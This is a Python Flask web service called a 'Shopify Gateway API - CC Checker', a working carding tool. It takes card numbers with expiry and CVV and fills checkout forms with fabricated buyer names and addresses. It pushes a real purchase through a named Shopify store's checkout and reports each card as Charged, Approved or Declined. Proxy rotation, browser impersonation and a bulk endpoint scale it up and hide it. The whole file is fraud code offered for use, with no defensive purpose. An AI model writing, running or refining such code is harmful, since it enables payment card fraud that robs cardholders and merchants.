#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shopify Gateway API - CC Checker
Endpoint: /shopify?site=<store>&cc=<cc|mm|yy|cvv>&proxy=<optional>
"""

import asyncio
import random
import re
import json
import os
import sys
import time
from urllib.parse import urlparse, quote
from flask import Flask, request, jsonify

# ---------- Auto-install required packages (only if missing) ----------
try:
    import flask
    import httpx
    import curl_cffi
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "flask", "httpx", "curl_cffi", "--quiet"])
    import flask
    import httpx
    import curl_cffi

# ---------- Imports ----------
from curl_cffi.requests import AsyncSession as CurlAsyncSession
app = Flask(__name__)

# ---------- Configuration ----------
CHROME_VERSIONS = ["chrome110", "chrome116", "chrome120", "chrome123", "chrome124"]
TIMEOUT = 35
MAX_RETRIES = 2

# ---------- Proxy handling ----------
def format_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("http://", "https://", "socks4://", "socks5://")):
        return proxy_str
    if "@" in proxy_str:
        auth, host_port = proxy_str.split("@", 1)
        return f"http://{auth}@{host_port}"
    if ":" in proxy_str:
        parts = proxy_str.split(":")
        if len(parts) >= 4:
            host, port, user, pwd = parts[0], parts[1], ":".join(parts[2:-1]), parts[-1]
            if port.isdigit():
                return f"http://{quote(user, safe='')}:{quote(pwd, safe='')}@{host}:{port}"
        if len(parts) == 2 and parts[1].isdigit():
            return f"http://{parts[0]}:{parts[1]}"
    return None

def load_proxies(source):
    if not source:
        return []
    source = source.strip()
    if source.lower().startswith("file:"):
        path = source[5:].strip()
        if not os.path.exists(path):
            return []
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if line.strip()]
        proxies = []
        for line in lines:
            p = format_proxy(line)
            if p:
                proxies.append(p)
        return proxies
    # comma separated
    return [p for part in source.split(",") if (p := format_proxy(part.strip()))]

# ---------- HTTP Client ----------
class CurlSessionWrapper:
    def __init__(self, session):
        self._s = session

    async def get(self, url, **kwargs):
        return await self._s.get(url, **kwargs)

    async def post(self, url, **kwargs):
        return await self._s.post(url, **kwargs)

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self._s.close()

def create_client(proxy=None):
    impersonate = random.choice(CHROME_VERSIONS)
    kw = {
        "impersonate": impersonate,
        "timeout": TIMEOUT,
        "verify": False,
        "allow_redirects": True,
    }
    if proxy:
        kw["proxy"] = proxy
    return CurlSessionWrapper(CurlAsyncSession(**kw))

# ---------- Utilities ----------
def random_user_info():
    first = ["John","Jane","Michael","Sarah","David","Emily","James","Emma","Robert","Olivia"]
    last = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Wilson","Taylor"]
    addr_pool = [
        {"add": "123 Main St", "city": "Portland", "state": "ME", "zip": "04101"},
        {"add": "456 Oak Ave", "city": "Bangor", "state": "ME", "zip": "04401"},
        {"add": "789 Pine Rd", "city": "Portland", "state": "ME", "zip": "04102"},
        {"add": "321 Elm St", "city": "Lewiston", "state": "ME", "zip": "04240"},
    ]
    addr = random.choice(addr_pool)
    f = random.choice(first)
    l = random.choice(last)
    email = f"{f.lower()}.{l.lower()}{random.randint(1,999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    phone = f"+1{random.choice(['202','310','415','617','212','312'])}{random.randint(1000000,9999999)}"
    return {
        "fname": f,
        "lname": l,
        "email": email,
        "phone": phone,
        "add1": addr["add"],
        "city": addr["city"],
        "state_short": addr["state"],
        "zip": addr["zip"],
    }

def find_between(text, start, end):
    try:
        i = text.find(start)
        if i == -1:
            return ""
        i += len(start)
        j = text.find(end, i)
        return text[i:j] if j != -1 else ""
    except:
        return ""

# ---------- Tokenization ----------
async def tokenize_card(session, cc, mon, year, cvv, info, site_url, ua):
    endpoints = [
        "https://deposit.us.shopifycs.com/sessions",
        "https://checkout.pci.shopifyinc.com/sessions",
        "https://checkout.shopifycs.com/sessions",
    ]
    card_json = {
        "credit_card": {
            "number": cc,
            "month": int(mon),
            "year": int(year),
            "verification_value": cvv,
            "name": f"{info['fname']} {info['lname']}",
        },
        "payment_session_scope": urlparse(site_url).netloc,
    }
    headers = {
        "User-Agent": ua,
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://checkout.shopifycs.com",
        "Referer": "https://checkout.shopifycs.com/",
    }
    for ep in endpoints:
        for _ in range(MAX_RETRIES):
            try:
                r = await session.post(ep, json=card_json, headers=headers)
                if r.status_code == 200:
                    data = r.json()
                    if data.get("id"):
                        return data["id"]
            except:
                continue
            await asyncio.sleep(0.5)
    return None

# ---------- GraphQL Query ----------
GRAPHQL_QUERY = """
mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!, $analytics: AnalyticsInput) {
  submitForCompletion(input: $input, attemptToken: $attemptToken, analytics: $analytics) {
    __typename
    ... on SubmitSuccess {
      receipt {
        __typename
        ... on ProcessedReceipt {
          id
          orderIdentity { id }
        }
        ... on ProcessingReceipt {
          id
          pollDelay
        }
        ... on FailedReceipt { id }
        ... on ActionRequiredReceipt { id }
      }
    }
    ... on SubmitRejected {
      errors {
        code
        localizedMessage
      }
    }
    ... on SubmitFailed {
      reason
    }
    ... on Throttled {
      pollAfter
    }
    ... on SubmittedForCompletion {
      receipt {
        __typename
        ... on ProcessedReceipt {
          id
          orderIdentity { id }
        }
        ... on ProcessingReceipt {
          id
          pollDelay
        }
        ... on FailedReceipt { id }
        ... on ActionRequiredReceipt { id }
      }
    }
  }
}
"""

# ---------- Main Check Function ----------
async def check_card(site_url, card_str, proxy_source, timeout=45):
    site_url = site_url.rstrip("/")
    parts = card_str.replace(" ", "").split("|")
    if len(parts) != 4:
        return {"status": "Error", "message": "Invalid format. Use cc|mm|yy|cvv"}

    cc, mon, year, cvv = parts

    proxies = load_proxies(proxy_source) if proxy_source else []
    proxy = random.choice(proxies) if proxies else None

    ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    try:
        async with create_client(proxy) as session:
            # 1. Get product list
            headers = {"User-Agent": ua, "Accept": "application/json"}
            resp = await session.get(f"{site_url}/products.json", headers=headers)
            if resp.status_code != 200:
                return {"status": "Error", "message": f"Products fetch failed ({resp.status_code})"}

            try:
                data = resp.json()
            except:
                return {"status": "Error", "message": "Invalid JSON from store"}

            products = data.get("products", [])
            if not products:
                return {"status": "Error", "message": "No products found"}

            # Pick first available variant (lowest price)
            variant = None
            product_title = None
            for p in products:
                for v in p.get("variants", []):
                    if v.get("available", True):
                        variant = v
                        product_title = p.get("title", "Unknown")
                        break
                if variant:
                    break
            if not variant:
                return {"status": "Error", "message": "No available variants"}

            variant_id = variant["id"]
            price = variant["price"]

            # 2. Add to cart
            add_headers = {"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded"}
            resp = await session.post(
                f"{site_url}/cart/add.js",
                data={"id": str(variant_id), "quantity": "1"},
                headers=add_headers,
            )
            if resp.status_code != 200:
                return {"status": "Error", "message": "Cart add failed"}

            # 3. Get cart token
            cart_resp = await session.get(f"{site_url}/cart.js", headers=headers)
            try:
                cart_data = cart_resp.json()
                token = cart_data.get("token")
            except:
                return {"status": "Error", "message": "Invalid cart response"}
            if not token:
                return {"status": "Error", "message": "No cart token"}

            # 4. Init checkout
            checkout_headers = {
                "User-Agent": ua,
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": site_url,
                "Referer": f"{site_url}/cart",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
            resp = await session.post(
                f"{site_url}/cart",
                data={"checkout": "", "updates[]": "1"},
                headers=checkout_headers,
                allow_redirects=True,
            )
            html = resp.text

            # Extract tokens
            st_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
            if not st_match:
                return {"status": "Error", "message": "No session token"}
            session_token = st_match.group(1)

            queue_token = find_between(html, 'queueToken&quot;:&quot;', '&quot;')
            stable_id = find_between(html, 'stableId&quot;:&quot;', '&quot;')
            payment_method_id = find_between(html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

            if not stable_id or not payment_method_id:
                return {"status": "Error", "message": "Missing checkout tokens"}

            # 5. Tokenize card
            info = random_user_info()
            session_id = await tokenize_card(session, cc, mon, year, cvv, info, site_url, ua)
            if not session_id:
                return {"status": "Error", "message": "Payment tokenization failed"}

            # 6. Build address
            address = {
                "address1": info["add1"],
                "address2": "",
                "city": info["city"],
                "countryCode": "US",
                "postalCode": info["zip"],
                "company": "",
                "firstName": info["fname"],
                "lastName": info["lname"],
                "zoneCode": info["state_short"],
                "phone": info["phone"],
            }

            requires_shipping = "SHIPPING" in html and "NONE" not in html

            # 7. Build delivery
            delivery_line = {
                "selectedDeliveryStrategy": {
                    "deliveryStrategyMatchingConditions": {
                        "estimatedTimeInTransit": {"any": True},
                        "shipments": {"any": True},
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "deliveryMethodTypes": ["SHIPPING"] if requires_shipping else ["NONE"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": True,
            }
            if requires_shipping:
                delivery_line["destination"] = {"streetAddress": address}

            delivery = {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
            }

            # 8. Build GraphQL payload
            payload = {
                "query": GRAPHQL_QUERY,
                "variables": {
                    "input": {
                        "sessionInput": {"sessionToken": session_token},
                        "queueToken": queue_token,
                        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": delivery,
                        "merchandise": {
                            "merchandiseLines": [
                                {
                                    "stableId": stable_id,
                                    "quantity": {"items": {"value": 1}},
                                    "expectedTotalPrice": {"any": True},
                                    "merchandise": {
                                        "productVariantReference": {
                                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                            "properties": [],
                                        }
                                    },
                                    "lineComponents": [],
                                    "lineComponentsSource": None,
                                }
                            ]
                        },
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [
                                {
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": payment_method_id,
                                            "sessionId": session_id,
                                            "billingAddress": {"streetAddress": address},
                                        }
                                    },
                                    "amount": {"any": True},
                                    "dueAt": None,
                                }
                            ],
                            "billingAddress": {"streetAddress": address},
                        },
                        "buyerIdentity": {
                            "buyerIdentity": {"presentmentCurrency": "USD", "countryCode": "US"},
                            "contactInfoV2": {"emailOrSms": {"value": info["email"], "emailOrSmsChanged": False}},
                            "marketingConsent": [{"email": {"value": info["email"]}}],
                            "shopPayOptInPhone": {"countryCode": "US"},
                        },
                        "taxes": {"proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}}},
                        "tip": {"tipLines": []},
                        "note": {"message": None, "customAttributes": []},
                    },
                    "attemptToken": f"{token}-{random.random()}",
                    "analytics": {
                        "requestUrl": f"{site_url}/checkouts/cn/{token}",
                        "pageId": f"{random.randint(10000000,99999999):08x}-{random.randint(1000,9999):04X}",
                    },
                },
                "operationName": "SubmitForCompletion",
            }

            # 9. Submit
            gql_headers = {
                "User-Agent": ua,
                "Content-Type": "application/json",
                "X-Checkout-One-Session-Token": session_token,
                "Origin": site_url,
                "Referer": f"{site_url}/",
                "Accept": "application/json",
            }
            resp = await session.post(
                f"{site_url}/checkouts/unstable/graphql",
                json=payload,
                headers=gql_headers,
            )
            if resp.status_code != 200:
                return {"status": "Error", "message": f"GraphQL {resp.status_code}"}

            try:
                result = resp.json()
            except:
                return {"status": "Error", "message": "Invalid GraphQL response"}

            # 10. Parse result
            completion = result.get("data", {}).get("submitForCompletion", {})
            if not completion:
                if result.get("errors"):
                    err_msgs = [e.get("message", "") for e in result["errors"]]
                    return {"status": "Error", "message": f"GraphQL: {', '.join(err_msgs)[:100]}"}
                return {"status": "Error", "message": "Empty completion"}

            typename = completion.get("__typename", "")

            if typename == "SubmitSuccess":
                receipt = completion.get("receipt")
                if receipt and receipt.get("__typename") == "ProcessedReceipt":
                    order_id = receipt.get("orderIdentity", {}).get("id", "N/A")
                    return {
                        "status": "Charged",
                        "message": "Payment successful! Money debited.",
                        "order_id": order_id,
                        "price": price,
                        "product": product_title,
                        "site": site_url.replace("https://", ""),
                    }
                elif receipt and receipt.get("__typename") == "ActionRequiredReceipt":
                    return {
                        "status": "Approved",
                        "message": "3DS verification required (card is valid)",
                        "price": price,
                        "product": product_title,
                        "site": site_url.replace("https://", ""),
                    }
                else:
                    return {
                        "status": "Approved",
                        "message": "Approved (check receipt)",
                        "price": price,
                        "product": product_title,
                        "site": site_url.replace("https://", ""),
                    }

            elif typename == "SubmitRejected":
                errors = completion.get("errors", [])
                codes = [e.get("code") for e in errors if e.get("code")]
                if codes:
                    return {
                        "status": "Declined",
                        "message": f"Declined: {codes[0]}",
                        "price": price,
                        "product": product_title,
                        "site": site_url.replace("https://", ""),
                    }
                return {
                    "status": "Declined",
                    "message": "Card declined",
                    "price": price,
                    "product": product_title,
                    "site": site_url.replace("https://", ""),
                }

            elif typename == "SubmitFailed":
                reason = completion.get("reason", "Unknown failure")
                return {
                    "status": "Declined",
                    "message": f"Payment failed: {reason}",
                    "price": price,
                    "product": product_title,
                    "site": site_url.replace("https://", ""),
                }

            elif typename == "Throttled":
                return {
                    "status": "Error",
                    "message": "Shopify throttled the request",
                    "price": price,
                    "product": product_title,
                    "site": site_url.replace("https://", ""),
                }

            elif typename == "CheckpointDenied":
                return {
                    "status": "Error",
                    "message": "CAPTCHA required",
                    "price": price,
                    "product": product_title,
                    "site": site_url.replace("https://", ""),
                }

            elif typename == "SubmittedForCompletion":
                return {
                    "status": "Processing",
                    "message": "Payment is being processed",
                    "price": price,
                    "product": product_title,
                    "site": site_url.replace("https://", ""),
                }

            else:
                return {
                    "status": "Error",
                    "message": f"Unknown typename: {typename}",
                    "price": price,
                    "product": product_title,
                    "site": site_url.replace("https://", ""),
                }

    except Exception as e:
        return {"status": "Error", "message": f"Unexpected error: {str(e)[:100]}"}

# ---------- Flask Routes ----------
@app.route("/shopify", methods=["GET"])
def shopify_check():
    site = request.args.get("site", "").strip()
    cc = request.args.get("cc", "").strip()
    proxy = request.args.get("proxy", "").strip() or None

    if not site or not cc or cc.count("|") != 3:
        return jsonify({
            "status": "Error",
            "message": "Missing or invalid parameters. Use: site=<url>&cc=CC|MM|YY|CVV&proxy=optional"
        }), 400

    try:
        result = asyncio.run(check_card(site, cc, proxy))
    except Exception as e:
        return jsonify({"status": "Error", "message": f"Server error: {str(e)}"}), 500

    # Ensure all keys present
    result.setdefault("price", "N/A")
    result.setdefault("product", "N/A")
    result.setdefault("site", site.replace("https://", "").replace("http://", ""))
    return jsonify(result)

@app.route("/shopify/bulk", methods=["POST"])
def shopify_bulk():
    data = request.get_json()
    if not data:
        return jsonify({"status": "Error", "message": "JSON required"}), 400

    site = data.get("site", "").strip()
    cards = data.get("cards", [])
    proxy = data.get("proxy", "").strip() or None

    if not site or not cards:
        return jsonify({"status": "Error", "message": "site and cards list required"}), 400

    results = []
    for card in cards:
        card = card.strip()
        if not card or card.count("|") != 3:
            results.append({"card": card, "status": "Error", "message": "Invalid format"})
            continue
        result = asyncio.run(check_card(site, card, proxy))
        result["card"] = card
        results.append(result)

    return jsonify({
        "status": "ok",
        "site": site,
        "total": len(results),
        "results": results
    })

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "version": "1.0", "message": "Shopify Gateway API running"})

@app.route("/", methods=["GET"])
def index():
    return jsonify({
        "name": "Shopify Gateway API",
        "version": "1.0",
        "endpoints": {
            "/shopify": "GET - Check one card (site, cc, proxy optional)",
            "/shopify/bulk": "POST - Check multiple cards (JSON with site, cards[], proxy optional)",
            "/health": "GET - Health check"
        },
        "example_GET": "/shopify?site=https://chemistfragrance.com&cc=4242424242424242|12|26|123&proxy=file:proxies.txt",
        "example_POST": {
            "site": "https://chemistfragrance.com",
            "cards": ["4242424242424242|12|26|123", "4111111111111111|12|26|123"],
            "proxy": "file:proxies.txt"
        }
    })

# ---------- Main ----------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, threaded=True, debug=False)
